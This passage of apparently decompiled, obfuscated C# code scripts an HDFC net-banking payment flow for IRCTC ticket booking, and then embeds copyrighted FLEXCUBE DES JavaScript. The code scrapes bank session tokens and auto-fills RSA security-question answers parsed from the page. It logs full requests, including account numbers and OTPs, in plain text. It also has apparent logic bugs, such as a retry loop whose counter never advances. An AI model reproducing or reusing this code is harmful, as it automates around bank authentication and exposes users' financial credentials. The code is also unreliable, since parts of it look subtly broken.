"&fldRsaAuthAction=OTPRELAY&fldOOBPhoneToken=&fldOOBPhoneRequest=&fldRsaQAAuthAvailable=N&fldRsaOOBPhoneAvailable=N&fldRsaSessionId=&fldRsaOTPAvailable=Y&fldOOBPhoneCountry=&fldOOBPhoneArea=&fldOOBPhoneNumber=&fldOOBPhoneExtn=&fldOOBPhoneLabel=&fldOOBPhoneCountryList=&fldOOBPhoneAreaList=&fldOOBPhoneNumberList=&fldOOBPhoneExtnList=&fldOOBPhoneLabelList=";
                                        if (!string.IsNullOrEmpty(value))
                                        {
                                            string_94 = string_94.Substring(string_94.IndexOf("var l_rsaTxnId\t= ") + 17);
                                            string string_96 = string_94.Substring(1, string_94.IndexOf("\";") - 1);
                                            string string_97 = string_94.Substring(string_94.IndexOf("</form>") + 8);
                                            text5 = class3_0.Method_SerialInp(string_97, ref string_92, false);
                                            string_92 = "https://netbanking.hdfcbank.com/netbanking/epientry";
                                            text5 = clsPostData.SetPost(text5, "fldRsaAuthTxnId", string_96);
                                            text5 = clsPostData.SetPost(text5, "fldRsaAuthAction", "OTPRELAY");
                                            text5 = clsPostData.SetPost(text5, "fldScrnSeqNbr", "06");
                                            text5 = clsPostData.SetPost(text5, "fldRsaAuthAction", "QUESTION");
                                            text5 = clsPostData.SetPost(text5, "fldOOBPhoneRequest", "N");
                                            string[] array3 = string_94.Substring(string_94.IndexOf("[qnt_count]") + 11).Split(new string[1] { "=" }, StringSplitOptions.None);
                                            string text29 = array3[1].Substring(0, array3[1].IndexOf("';")).Replace(" '", "");
                                            string text30 = array3[2].Substring(2, array3[2].IndexOf("\";") - 2).Replace("\";\r", "");
                                            string text31 = text30;
                                            int startIndex2 = text31.IndexOf("(") + 1;
                                            num2 = text31.IndexOf(",", startIndex2);
                                            if (num2 < 0)
                                            {
                                                num2 = text31.IndexOf("/", startIndex2);
                                            }
                                            startIndex2 = text31.LastIndexOf(" ", num2);
                                            num2 -= startIndex2;
                                            text31 = text31.Substring(startIndex2, num2).Trim();
                                            string text32 = text31;
                                            string text33 = array3[3].Substring(0, array3[3].IndexOf("';")).Replace(" '", "");
                                            string text34 = array3[4].Substring(2, array3[4].IndexOf("\";") - 2).Replace("\";\r", "");
                                            text31 = text34;
                                            startIndex2 = text31.IndexOf("(") + 1;
                                            num2 = text31.IndexOf(",", startIndex2);
                                            if (num2 < 0)
                                            {
                                                num2 = text31.IndexOf("/", startIndex2);
                                            }
                                            startIndex2 = text31.LastIndexOf(" ", num2);
                                            num2 -= startIndex2;
                                            text31 = text31.Substring(startIndex2, num2).Trim();
                                            string text35 = text31;
                                            string text36 = "&fldQuestionId=" + text29 + "&fldQuestionText=" + HttpUtility.UrlEncode(text30) + "&fldAnswer=" + text32 + "&fldQuestionId=" + text33 + "&fldQuestionText=" + HttpUtility.UrlEncode(text34) + "&fldAnswer=" + text35;
                                            text5 = clsPostData.SetPost(text5, "fldQuestionId", "00");
                                            text5 = clsPostData.SetPost(text5, "fldQuestionText", "00");
                                            text5 = clsPostData.SetPost(text5, "fldAnswer", "00");
                                            text5 = text5.Replace("&fldQuestionId=00", "").Replace("&fldQuestionText=00", "").Replace("&fldAnswer=00", "");
                                            text5 = clsPostData.SetPost(text5, "fldQuestionId", "00");
                                            text5 = clsPostData.SetPost(text5, "fldQuestionText", "00");
                                            text5 = clsPostData.SetPost(text5, "fldAnswer", "00");
                                            text5 = text5.Replace("&fldQuestionId=00", "").Replace("&fldQuestionText=00", "").Replace("&fldAnswer=00", "");
                                            text5 += text36;
                                            text5 = clsPostData.SetPost(text5, "fldMerchName", text25);
                                        }
                                        clsMain.Lock("Sixth Hit : Inp = " + text5);
                                        if (updateTStatus_1 != null)
                                        {
                                            updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(6/8)", tCntrlName_, null, null);
                                        }
                                        int num3 = 0;
                                        string_94 = null;
                                        while (true)
                                        {
                                            bool flag = _Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, 180000, 180000, ref string_94, ref string_93, ref webException_0);
                                            if (!flag)
                                            {
                                                if (num3 < 5)
                                                {
                                                    continue;
                                                }
                                                clsMain.Lock("Sixth Hit Failed. err = " + string_93);
                                                string_90 = "Failed while making Payment. Payment Not Done";
                                                break;
                                            }
                                            num3++;
                                            if (!flag && num3 <= 5)
                                            {
                                                continue;
                                            }
                                            clsMain.Lock("Sixth Hit Output = " + string_94);
                                            if (string_94.Contains("<body onload=\"return logout()"))
                                            {
                                                List<string> list = new List<string>(string_94.Split(new string[1] { "<input" }, StringSplitOptions.None));
                                                list.RemoveAll((string string_0) => !string_0.ToLower().Contains("fldrequestid") && !string_0.ToLower().Contains("fldsessionid") && !string_0.ToLower().Contains("redirecturl"));
                                                string text37 = string.Empty;
                                                string text38 = string.Empty;
                                                string text39 = string.Empty;
                                                foreach (string item in list)
                                                {
                                                    if (item.ToLower().Contains("fldsessionid"))
                                                    {
                                                        text38 = item.Trim().Split(' ')[0].Split('=')[1].Trim('"');
                                                    }
                                                    if (item.ToLower().Contains("fldrequestid"))
                                                    {
                                                        text37 = item.Trim().Split(' ')[0].Split('=')[1].Trim('"');
                                                    }
                                                    if (item.ToLower().Contains("redirecturl"))
                                                    {
                                                        text39 = item.Trim().Substring(6, item.IndexOf("name") - 8).Replace("\"", "");
                                                        text39 = text39.Replace("&amp;", "%26").Replace("=", "%3D").Replace("?", "%3f");
                                                    }
                                                }
                                                text5 = "fldAppId=XT&fldTxnId=LGF&fldScrnSeqNbr=01&fldSessionId=" + text38 + "&fldRequestId=" + text37 + "&fldAppId=XT&fldTxnId=LGF&fldScrnSeqNbr=01&fldSessionId=" + text38 + "&fldRequestId=" + text37 + "&REDIRECTURL=" + text39 + "&method=P&methodtype=";
                                            }
                                            else
                                            {
                                                if (string_94.Contains("document.forms[0].submit();"))
                                                {
                                                    string_89 = string_94;
                                                    string_90 = string_92;
                                                    return true;
                                                }
                                                if (!string_94.Contains("One Time Password "))
                                                {
                                                    string_90 = "Failed while Processing into HDFC after Login";
                                                    clsMain.Lock("Fifth Hit Failed, Not valid HTML err = " + string_90);
                                                    break;
                                                }
                                                startIndex = string_94.IndexOf("name=\"fldRequestId");
                                                startIndex = string_94.LastIndexOf("<", startIndex);
                                                startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                                text21 = string_94.Substring(startIndex, length).Trim();
                                                startIndex = string_94.IndexOf("name=\"fldRemoteAddress");
                                                startIndex = string_94.LastIndexOf("<", startIndex);
                                                startIndex = string_94.IndexOf("lue=\"", startIndex) + 5;
                                                length = string_94.IndexOf("\"", startIndex) - startIndex;
                                                text27 = string_94.Substring(startIndex, length).Trim();
                                                string string_98 = "123456";
                                                if (!method_163("Enter HDFC OTP For Branch Name:." + text24, ref string_98, ref string_90))
                                                {
                                                    return false;
                                                }
                                                text5 = "fldAppId=XT&fldTxnId=XFT&fldScrnSeqNbr=06&fldSessionId=" + text20 + "&fldRequestId=" + text21 + "&fldOtpToken=" + string_98 + "&fldTxnCurr=INR&fldMobile=on&fldCodAcctNo=" + HttpUtility.UrlEncode(str5) + "&fldBrnList=" + HttpUtility.UrlEncode(text24) + "%7E%3A%3A%7E&urlChallanDtl=&fldDynamicUrl=" + HttpUtility.UrlEncode(str2) + "&fldTxnScAmt=" + text12 + "&fldAcctList=" + HttpUtility.UrlEncode(str5) + "%7E%3A%3A%7E&fldExtSessionId=" + text26 + "&fldAdditionalFields=&fldCodOrgBrn=&fldBalList=" + text23 + "%7E%3A%3A%7E&fldRsaSessionId=&fldMerchName=" + text25 + "&fldRsaTxnType=&fldTxnAmt=" + text11 + "&fldRemoteAddress=" + text27 + "&fldMerchCode=" + text6 + "&fldMerchRefNo=" + text9 + "&fldCcyList=INR%7E%3A%3A%7E&fldRsaOTPAvailable=Y&fldRsaAuthReq=Y&fldClientCode=" + text8 + "&fldBrnName=" + HttpUtility.UrlEncode(text24) + "&fldOOBPhoneExtn=&fldMsgSentMode=M&fldPinRequired=Y&fldPin=Y&fldPinSequence=1&fldRsaAuthRetry=&fldRsaAuthTxnId=" + text28 + "&fldRsaAuthAction=OTP&fldOOBPhoneToken=&fldOOBPhoneRequest=&fldRsaQAAuthAvailable=N&fldRsaOOBPhoneAvailable=N&fldRsaSessionId=" + text26 + "&fldRsaOTPAvailable=Y&fldOOBPhoneCountry=&fldOOBPhoneArea=&fldOOBPhoneNumber=&fldOOBPhoneExtn=&fldOOBPhoneLabel=&fldOOBPhoneCountryList=&fldOOBPhoneAreaList=&fldOOBPhoneNumberList=&fldOOBPhoneExtnList=&fldOOBPhoneLabelList=";
                                                clsMain.Lock("Seventh Hit : Inp = " + text5);
                                                if (updateTStatus_1 != null)
                                                {
                                                    updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(7/8)", tCntrlName_, null, null);
                                                }
                                                if (!_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0))
                                                {
                                                    clsMain.Lock("Seventh Hit Failed. err = " + string_93);
                                                    string_90 = "Failed while making Payment. Payment Not Done";
                                                    break;
                                                }
                                                clsMain.Lock("Seventh Hit Output = " + string_94);
                                                string string_99 = "";
                                                text5 = class3_0.Method_SerialInp(string_94, ref string_99, true);
                                                if (!string_94.Contains("https://www.irctc.co.in/eticketing/BankResponse?ClientCode"))
                                                {
                                                    string_90 = "Failed while Processing into HDFC, Ticket Not Booked";
                                                    clsMain.Lock("Fourth Hit Failed, Not valid HTML err = " + string_90);
                                                    break;
                                                }
                                            }
                                            clsMain.Lock("Eigth Hit Inp = " + text5);
                                            if (updateTStatus_1 != null)
                                            {
                                                updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(8/8)", tCntrlName_, null, null);
                                            }
                                            if (!_Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0))
                                            {
                                                clsMain.Lock("Eigth Hit Failed. err = " + string_93);
                                                string_90 = "Failed while making Payment at HDFC. Ticket Not Booked";
                                                break;
                                            }
                                            clsMain.Lock("Eigth Hit output = " + string_94);
                                            if (string_94.Contains("document.frmredirect.submit"))
                                            {
                                                string_89 = string_94;
                                                string_90 = string_92;
                                                return true;
                                            }
                                            string_90 = "Failed while Processing into HDFC, Ticket Not Booked";
                                            clsMain.Lock("Eigth Hit Failed, Not valid HTML err = " + string_90);
                                            break;
                                        }
                                        break;
                                    }
                                    clsMain.Lock("Third Hit Failed. err = " + string_93);
                                    string_90 = "Failed while making Payment. Payment Not Done";
                                    break;
                                }
                                clsMain.Lock("Second Hit Failed. err = " + string_93);
                                string_90 = "Failed while making Payment. Payment Not Done";
                                break;
                            }
                            return result;
                        }
                        clsMain.Lock("First Hit Failed. err = " + string_93);
                        string_90 = "HDFC Not Working - Payment Failed";
                        break;
                    }
                    clsMain.Lock("First Hit Failed. err = " + string_93);
                    string_90 = "HDFC Not Working - Payment Failed";
                    text5 = "fldAppId=RS&fldTxnId=LGF&fldScrnSeqNbr=01&fldModule=CH&fldSessionId=" + text3 + "&fldRequestId=" + text4 + "&fldTxnRequest=";
                    clsMain.Lock("Seventh Hit : Inp = " + text5);
                    if (updateTStatus_1 != null)
                    {
                        updateTStatus_1.BeginInvoke(1, "Init. HDFC_NB(0/8)", tCntrlName_, null, null);
                    }
                    _Request(string_92, text5, string_91, webProxy_3, ref cookieContainer_, true, true, num, num, ref string_94, ref string_93, ref webException_0);
                    result2 = false;
                }
                catch (Exception ex)
                {
                    clsMain.method_74("ProcessHDFCNetBanking", ex.Message);
                    result2 = false;
                }
                return result2;
            }
            string_90 = "Some thing went wrong with HDFC Payment";
            clsMain.Lock("Html doesn't contains hdfcbank, returning.");
            return false;
        }

        private string method_5(string string_86, ref string string_87)
        {
            string text = "<html>\n<head>\n<script type=\"text/javascript\">\n\t/*-----------------------------------------------------------------------------\n\tThis source is part of the FLEXCUBE@ Java App Server Software System and is\n\tcopyrighted by i-flex Solutions Limited.\n\tAll rights reserved. No part of this work may be reproduced, stored in a\n\tretrieval system, adopted or transmitted in any form or by any means,\n\telectronic, mechanical, photographic, graphic, optic recording or otherwise,\n\ttranslated in any language or computer language, without the prior written\n\tpermission of i-flex Solutions Limited.\n\ti-flex Solutions Limited.\n\t10-11, SDF I, SEEPZ, Andheri (East),\n\tMumbai - 400 096.\n\tIndia\n\tCopyright 2004 i-flex Solutions Limited.\n\tModification History\n\tDate Version Author Description\n\t__________ ___________ _______________ ________________________________________\n\t22/11/2012 1.0 Sandeep Saxena Des algo\n\t------------------------------------------------------------------------------*/\n\t//des\n\t//this takes the key, the message, and whether to encrypt or decrypt\n\tfunction des (key, message, encrypt, mode, iv, padding) {\n\t//declaring this locally speeds things up a bit\n\tvar spfunction1 = new Array (0x1010400,0,0x10000,0x1010404,0x1010004,0x10404,0x4,0x10000,0x400,0x1010400,0x1010404,0x400,0x1000404,0x1010004,0x1000000,0x4,0x404,0x1000400,0x1000400,0x10400,0x10400,0x1010000,0x1010000,0x1000404,0x10004,0x1000004,0x1000004,0x10004,0,0x404,0x10404,0x1000000,0x10000,0x1010404,0x4,0x1010000,0x1010400,0x1000000,0x1000000,0x400,0x1010004,0x10000,0x10400,0x1000004,0x400,0x4,0x1000404,0x10404,0x1010404,0x10004,0x1010000,0x1000404,0x1000004,0x404,0x10404,0x1010400,0x404,0x1000400,0x1000400,0,0x10004,0x10400,0,0x1010004);\n\tvar spfunction2 = new Array (-0x7fef7fe0,-0x7fff8000,0x8000,0x108020,0x100000,0x20,-0x7fefffe0,-0x7fff7fe0,-0x7fffffe0,-0x7fef7fe0,-0x7fef8000,-0x80000000,-0x7fff8000,0x100000,0x20,-0x7fefffe0,0x108000,0x100020,-0x7fff7fe0,0,-0x80000000,0x8000,0x108020,-0x7ff00000,0x100020,-0x7fffffe0,0,0x108000,0x8020,-0x7fef8000,-0x7ff00000,0x8020,0,0x108020,-0x7fefffe0,0x100000,-0x7fff7fe0,-0x7ff00000,-0x7fef8000,0x8000,-0x7ff00000,-0x7fff8000,0x20,-0x7fef7fe0,0x108020,0x20,0x8000,-0x80000000,0x8020,-0x7fef8000,0x100000,-0x7fffffe0,0x100020,-0x7fff7fe0,-0x7fffffe0,0x100020,0x108000,0,-0x7fff8000,0x8020,-0x80000000,-0x7fefffe0,-0x7fef7fe0,0x108000);\n\tvar spfunction3 = new Array (0x208,0x8020200,0,0x8020008,0x8000200,0,0x20208,0x8000200,0x20008,0x8000008,0x8000008,0x20000,0x8020208,0x20008,0x8020000,0x208,0x8000000,0x8,0x8020200,0x200,0x20200,0x8020000,0x8020008,0x20208,0x8000208,0x20200,0x20000,0x8000208,0x8,0x8020208,0x200,0x8000000,0x8020200,0x8000000,0x20008,0x208,0x20000,0x8020200,0x8000200,0,0x200,0x20008,0x8020208,0x8000200,0x8000008,0x200,0,0x8020008,0x8000208,0x20000,0x8000000,0x8020208,0x8,0x20208,0x20200,0x8000008,0x8020000,0x8000208,0x208,0x8020000,0x20208,0x8,0x8020008,0x20200);\n\tvar spfunction4 = new Array (0x802001,0x2081,0x2081,0x80,0x802080,0x800081,0x800001,0x2001,0,0x802000,0x802000,0x802081,0x81,0,0x800080,0x800001,0x1,0x2000,0x800000,0x802001,0x80,0x800000,0x2001,0x2080,0x800081,0x1,0x2080,0x800080,0x2000,0x802080,0x802081,0x81,0x800080,0x800001,0x802000,0x802081,0x81,0,0,0x802000,0x2080,0x800080,0x800081,0x1,0x802001,0x2081,0x2081,0x80,0x802081,0x81,0x1,0x2000,0x800001,0x2001,0x802080,0x800081,0x2001,0x2080,0x800000,0x802001,0x80,0x800000,0x2000,0x802080);\n\tvar spfunction5 = new Array (0x100,0x2080100,0x2080000,0x42000100,0x80000,0x100,0x40000000,0x2080000,0x40080100,0x80000,0x2000100,0x40080100,0x42000100,0x42080000,0x80100,0x40000000,0x2000000,0x40080000,0x40080000,0,0x40000100,0x42080100,0x42080100,0x2000100,0x42080000,0x40000100,0,0x42000000,0x2080100,0x2000000,0x42000000,0x80100,0x80000,0x42000100,0x100,0x2000000,0x40000000,0x2080000,0x42000100,0x40080100,0x2000100,0x40000000,0x42080000,0x2080100,0x40080100,0x100,0x2000000,0x42080000,0x42080100,0x80100,0x42000000,0x42080100,0x2080000,0,0x40080000,0x42000000,0x80100,0x2000100,0x40000100,0x80000,0,0x40080000,0x2080100,0x40000100);\n\tvar spfunction6 = new Array (0x20000010,0x20400000,0x4000,0x20404010,0x20400000,0x10,0x20404010,0x400000,0x20004000,0x404010,0x400000,0x20000010,0x400010,0x20004000,0x20000000,0x4010,0,0x400010,0x20004010,0x4000,0x404000,0x20004010,0x10,0x20400010,0x20400010,0,0x404010,0x20404000,0x4010,0x404000,0x20404000,0x20000000,0x20004000,0x10,0x20400010,0x404000,0x20404010,0x400000,0x4010,0x20000010,0x400000,0x20004000,0x20000000,0x4010,0x20000010,0x20404010,0x404000,0x20400000,0x404010,0x20404000,0,0x20400010,0x10,0x4000,0x20400000,0x404010,0x4000,0x400010,0x20004010,0,0x20404000,0x20000000,0x400010,0x20004010);\n\tvar spfunction7 = new Array (0x200000,0x4200002,0x4000802,0,0x800,0x4000802,0x200802,0x4200800,0x4200802,0x200000,0,0x4000002,0x2,0x4000000,0x4200002,0x802,0x4000800,0x200802,0x200002,0x4000800,0x4000002,0x4200000,0x4200800,0x200002,0x4200000,0x800,0x802,0x4200802,0x200800,0x2,0x4000000,0x200800,0x4000000,0x200800,0x200000,0x4000802,0x4000802,0x4200002,0x4200002,0x2,0x200002,0x4000000,0x4000800,0x200000,0x4200800,0x802,0x200802,0x4200800,0x802,0x4000002,0x4200802,0x4200000,0x200800,0,0x2,0x4200802,0,0x200802,0x4200000,0x800,0x4000002,0x4000800,0x800,0x200002);\n\tvar spfunction8 = new Array (0x10001040,0x1000,0x40000,0x10041040,0x10000000,0x10001040,0x40,0x10000000,0x40040,0x10040000,0x10041040,0x41000,0x10041000,0x41040,0x1000,0x40,0x10040000,0x10000040,0x10001000,0x1040,0x41000,0x40040,0x10040040,0x10041000,0x1040,0,0,0x10040040,0x10000040,0x10001000,0x41040,0x40000,0x41040,0x40000,0x10041000,0x1000,0x40,0x10040040,0x1000,0x41040,0x10001000,0x40,0x10000040,0x10040000,0x10040040,0x10000000,0x40000,0x10001040,0,0x10041040,0x40040,0x10000040,0x10040000,0x10001000,0x10001040,0,0x10041040,0x41000,0x41000,0x1040,0x1040,0x40040,0x10000000,0x10041000);\n\t//create the 16 or 48 subkeys we will need\n\tvar keys = des_createKeys (key);\n\tvar m=0, i, j, temp, temp2, right1, right2, left, right, looping;\n\tvar cbcleft, cbcleft2, cbcright, cbcright2\n\tvar endloop, loopinc;\n\tvar len = message.length;\n\tvar chunk = 0;\n\t//set up the loops for single and triple des\n\tvar iterations = keys.length == 32 ? 3 : 9; //single or triple des\n\tif (iterations == 3) {looping = encrypt ? new Array (0, 32, 2) : new Array (30, -2, -2);}\n\telse {looping = encrypt ? new Array (0, 32, 2, 62, 30, -2, 64, 96, 2) : new Array (94, 62, -2, 32, 64, 2, 30, -2, -2);}\n\t//pad the message depending on the padding parameter\n\tif (padding == 2) message += \" \"; //pad the message with spaces\n\telse if (padding == 1) {temp = 8-(len%8); message += String.fromCharCode (temp,temp,temp,temp,temp,temp,temp,temp); if (temp==8) len+=8;} //PKCS7 padding\n\telse if (!padding) message += \"\\0\\0\\0\\0\\0\\0\\0\\0\"; //pad the message out with null bytes\n\t//store the result here\n\tresult = \"\";\n\ttempresult = \"\";\n\tif (mode == 1) { //CBC mode\n\tcbcleft = (iv.charCodeAt(m++) << 24) | (iv.charCodeAt(m++) << 16) | (iv.charCodeAt(m++) << 8) | iv.charCodeAt(m++);\n\tcbcright = (iv.charCodeAt(m++) << 24) | (iv.charCodeAt(m++) << 16) | (iv.charCodeAt(m++) << 8) | iv.charCodeAt(m++);\n\tm=0;\n\t}\n\t//loop through each 64 bit chunk of the message\n\twhile (m < len) {\n\tleft = (message.charCodeAt(m++) << 24) | (message.charCodeAt(m++) << 16) | (message.charCodeAt(m++) << 8) | message.charCodeAt(m++);\n\tright = (message.charCodeAt(m++) << 24) | (message.charCodeAt(m++) << 16) | (message.charCodeAt(m++) << 8) | message.charCodeAt(m++);\n\t//for Cipher Block Chaining mode, xor the message with the previous result\n\tif (mode == 1) {if (encrypt) {left ^= cbcleft; right ^= cbcright;} else {cbcleft2 = cbcleft; cbcright2 = cbcright; cbcleft = left; cbcright = right;}}\n\t//first each 64 but chunk of the message must be permuted according to IP\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\ttemp = ((left >>> 16) ^ right) & 0x0000ffff; right ^= temp; left ^= (temp << 16);\n\ttemp = ((right >>> 2) ^ left) & 0x33333333; left ^= temp; right ^= (temp << 2);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\tleft = ((left << 1) | (left >>> 31));\n\tright = ((right << 1) | (right >>> 31));\n\t//do this either 1 or 3 times for each chunk of the message\n\tfor (j=0; j<iterations; j+=3) {\n\tendloop = looping[j+1];\n\tloopinc = looping[j+2];\n\t//now go through and perform the encryption or decryption\n\tfor (i=looping[j]; i!=endloop; i+=loopinc) { //for efficiency\n\tright1 = right ^ keys[i];\n\tright2 = ((right >>> 4) | (right << 28)) ^ keys[i+1];\n\t//the result is attained by passing these bytes through the S selection functions\n\ttemp = left;\n\tleft = right;\n\tright = temp ^ (spfunction2[(right1 >>> 24) & 0x3f] | spfunction4[(right1 >>> 16) & 0x3f]\n\t| spfunction6[(right1 >>> 8) & 0x3f] | spfunction8[right1 & 0x3f]\n\t| spfunction1[(right2 >>> 24) & 0x3f] | spfunction3[(right2 >>> 16) & 0x3f]\n\t| spfunction5[(right2 >>> 8) & 0x3f] | spfunction7[right2 & 0x3f]);\n\t}\n\ttemp = left; left = right; right = temp; //unreverse left and right\n\t} //for either 1 or 3 iterations\n\t//move then each one bit to the right\n\tleft = ((left >>> 1) | (left << 31));\n\tright = ((right >>> 1) | (right << 31));\n\t//now perform IP-1, which is IP in the opposite direction\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((right >>> 2) ^ left) & 0x33333333; left ^= temp; right ^= (temp << 2);\n\ttemp = ((left >>> 16) ^ right) & 0x0000ffff; right ^= temp; left ^= (temp << 16);\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\t//for Cipher Block Chaining mode, xor the message with the previous result\n\tif (mode == 1) {if (encrypt) {cbcleft = left; cbcright = right;} else {left ^= cbcleft2; right ^= cbcright2;}}\n\ttempresult += String.fromCharCode ((left>>>24), ((left>>>16) & 0xff), ((left>>>8) & 0xff), (left & 0xff), (right>>>24), ((right>>>16) & 0xff), ((right>>>8) & 0xff), (right & 0xff));\n\tchunk += 8;\n\tif (chunk == 512) {result += tempresult; tempresult = \"\"; chunk = 0;}\n\t} //for every 8 characters, or 64 bits in the message\n\t//return the result as an array\n\treturn result + tempresult;\n\t} //end of des\n\t//des_createKeys\n\t//this takes as input a 64 bit key (even though only 56 bits are used)\n\t//as an array of 2 integers, and returns 16 48 bit keys\n\tfunction des_createKeys (key) {\n\t//declaring this locally speeds things up a bit\n\tpc2bytes0 = new Array (0,0x4,0x20000000,0x20000004,0x10000,0x10004,0x20010000,0x20010004,0x200,0x204,0x20000200,0x20000204,0x10200,0x10204,0x20010200,0x20010204);\n\tpc2bytes1 = new Array (0,0x1,0x100000,0x100001,0x4000000,0x4000001,0x4100000,0x4100001,0x100,0x101,0x100100,0x100101,0x4000100,0x4000101,0x4100100,0x4100101);\n\tpc2bytes2 = new Array (0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808,0,0x8,0x800,0x808,0x1000000,0x1000008,0x1000800,0x1000808);\n\tpc2bytes3 = new Array (0,0x200000,0x8000000,0x8200000,0x2000,0x202000,0x8002000,0x8202000,0x20000,0x220000,0x8020000,0x8220000,0x22000,0x222000,0x8022000,0x8222000);\n\tpc2bytes4 = new Array (0,0x40000,0x10,0x40010,0,0x40000,0x10,0x40010,0x1000,0x41000,0x1010,0x41010,0x1000,0x41000,0x1010,0x41010);\n\tpc2bytes5 = new Array (0,0x400,0x20,0x420,0,0x400,0x20,0x420,0x2000000,0x2000400,0x2000020,0x2000420,0x2000000,0x2000400,0x2000020,0x2000420);\n\tpc2bytes6 = new Array (0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002,0,0x10000000,0x80000,0x10080000,0x2,0x10000002,0x80002,0x10080002);\n\tpc2bytes7 = new Array (0,0x10000,0x800,0x10800,0x20000000,0x20010000,0x20000800,0x20010800,0x20000,0x30000,0x20800,0x30800,0x20020000,0x20030000,0x20020800,0x20030800);\n\tpc2bytes8 = new Array (0,0x40000,0,0x40000,0x2,0x40002,0x2,0x40002,0x2000000,0x2040000,0x2000000,0x2040000,0x2000002,0x2040002,0x2000002,0x2040002);\n\tpc2bytes9 = new Array (0,0x10000000,0x8,0x10000008,0,0x10000000,0x8,0x10000008,0x400,0x10000400,0x408,0x10000408,0x400,0x10000400,0x408,0x10000408);\n\tpc2bytes10 = new Array (0,0x20,0,0x20,0x100000,0x100020,0x100000,0x100020,0x2000,0x2020,0x2000,0x2020,0x102000,0x102020,0x102000,0x102020);\n\tpc2bytes11 = new Array (0,0x1000000,0x200,0x1000200,0x200000,0x1200000,0x200200,0x1200200,0x4000000,0x5000000,0x4000200,0x5000200,0x4200000,0x5200000,0x4200200,0x5200200);\n\tpc2bytes12 = new Array (0,0x1000,0x8000000,0x8001000,0x80000,0x81000,0x8080000,0x8081000,0x10,0x1010,0x8000010,0x8001010,0x80010,0x81010,0x8080010,0x8081010);\n\tpc2bytes13 = new Array (0,0x4,0x100,0x104,0,0x4,0x100,0x104,0x1,0x5,0x101,0x105,0x1,0x5,0x101,0x105);\n\t//how many iterations (1 for des, 3 for triple des)\n\tvar iterations = key.length > 8 ? 3 : 1; //changed by Paul 16/6/2007 to use Triple DES for 9+ byte keys\n\t//stores the return keys\n\tvar keys = new Array (32 * iterations);\n\t//now define the left shifts which need to be done\n\tvar shifts = new Array (0, 0, 1, 1, 1, 1, 1, 1, 0, 1, 1, 1, 1, 1, 1, 0);\n\t//other variables\n\tvar lefttemp, righttemp, m=0, n=0, temp;\n\tfor (var j=0; j<iterations; j++) { //either 1 or 3 iterations\n\tleft = (key.charCodeAt(m++) << 24) | (key.charCodeAt(m++) << 16) | (key.charCodeAt(m++) << 8) | key.charCodeAt(m++);\n\tright = (key.charCodeAt(m++) << 24) | (key.charCodeAt(m++) << 16) | (key.charCodeAt(m++) << 8) | key.charCodeAt(m++);\n\ttemp = ((left >>> 4) ^ right) & 0x0f0f0f0f; right ^= temp; left ^= (temp << 4);\n\ttemp = ((right >>> -16) ^ left) & 0x0000ffff; left ^= temp; right ^= (temp << -16);\n\ttemp = ((left >>> 2) ^ right) & 0x33333333; right ^= temp; left ^= (temp << 2);\n\ttemp = ((right >>> -16) ^ left) & 0x0000ffff; left ^= temp; right ^= (temp << -16);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\ttemp = ((right >>> 8) ^ left) & 0x00ff00ff; left ^= temp; right ^= (temp << 8);\n\ttemp = ((left >>> 1) ^ right) & 0x55555555; right ^= temp; left ^= (temp << 1);\n\t//the right side needs to be shifted and to get the last four bits of the left side\n\ttemp = (left << 8) | ((right >>> 20) & 0x000000f0);\n\t//left needs to be put upside down\n\tleft = (right << 24) | ((right << 8) & 0xff0000) | ((right >>> 8) & 0xff00) | ((right >>> 24) & 0xf0);\n\tright = temp;\n\t//now go through and perform these shifts on the left and right keys\n\tfor (var i=0; i < shifts.length; i++) {\n\t//shift the keys either one or two bits to the left\n\tif (shifts[i]) {left = (left << 2) | (left >>> 26); right = (right << 2) | (right >>> 26);}\n\telse {left = (left << 1) | (left >>> 27); right = (right << 1) | (right >>> 27);}\n\tleft &= -0xf; right &= -0xf;\n\t//now apply PC-2, in such a way that E is easier when encrypting or decrypting\n\t//this conversion will look like PC-2 except only the last 6 bits of each byte are used\n\t//rather than 48 consecutive bits and the order of lines will be according to\n\t//how the S selection functions will be applied: S2, S4, S6, S8, S1, S3, S5, S7\n\tlefttemp = pc2bytes0[left >>> 28] | pc2bytes1[(left >>> 24) & 0xf]\n\t| pc2bytes2[(left >>> 20) & 0xf] | pc2bytes3[(left >>> 16) & 0xf]\n\t| pc2bytes4[(left >>> 12) & 0xf] | pc2bytes5[(left >>> 8) & 0xf]\n\t| pc2bytes6[(left >>> 4) & 0xf];\n\trighttemp = pc2bytes7[right >>> 28] | pc2bytes8[(right >>> 24) & 0xf]\n\t| pc2bytes9[(right >>> 20) & 0xf] | pc2bytes10[(right >>> 16) & 0xf]\n\t| pc2bytes11[(right >>> 12) & 0xf] | pc2bytes12[(right >>> 8) & 0xf]\n\t| pc2bytes13[(right >>> 4) & 0xf];\n\ttemp = ((righttemp >>> 16) ^ lefttemp) & 0x0000ffff;\n\tkeys[n++] = lefttemp ^ temp; keys[n++] = righttemp ^ (temp << 16);\n\t}\n\t} //for each iterations\n\t//return the keys we've created\n\treturn keys;\n\t} //end of des_createKeys\n\t////////////////////////////// TEST //////////////////////////////\n\tfunction stringToHex (s) {\n\tvar r = \"0x\";\n\tvar hexes = new Array 